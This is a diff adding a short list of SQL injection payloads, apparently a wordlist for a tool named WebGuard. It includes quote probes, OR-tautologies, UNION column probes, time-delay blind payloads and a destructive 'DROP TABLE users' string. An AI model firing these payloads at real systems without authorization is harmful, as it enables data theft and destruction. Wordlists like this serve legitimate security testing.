@@ -1,0 +1,17 @@
+# WebGuard v3 — SQL Injection Payloads
+'
+"
+';
+" --
+') --
+' OR '1'='1
+' OR 1=1--
+1' ORDER BY 1--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+' AND SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'--
+' OR pg_sleep(3)--
+' AND 1=1--
+' AND 1=2--
+1; DROP TABLE users--
